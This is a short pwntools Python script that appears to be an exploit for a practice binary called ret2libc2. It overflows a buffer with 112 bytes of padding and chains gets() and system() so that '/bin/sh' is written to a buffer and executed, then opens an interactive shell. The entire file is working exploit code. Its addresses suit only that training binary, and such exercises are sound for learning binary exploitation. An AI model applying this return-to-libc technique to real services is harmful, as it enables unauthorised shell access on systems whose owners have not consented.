from pwn import *

io = process('../ex1-rop/ret2libc2')
system_addr = 0x08048490
gets_addr = 0x08048460
buf2_addr = 0x0804A080

payload = flat(["a"*112,gets_addr,system_addr,buf2_addr,buf2_addr])

io.sendline(payload)
io.sendline(b"/bin/sh")
io.interactive()
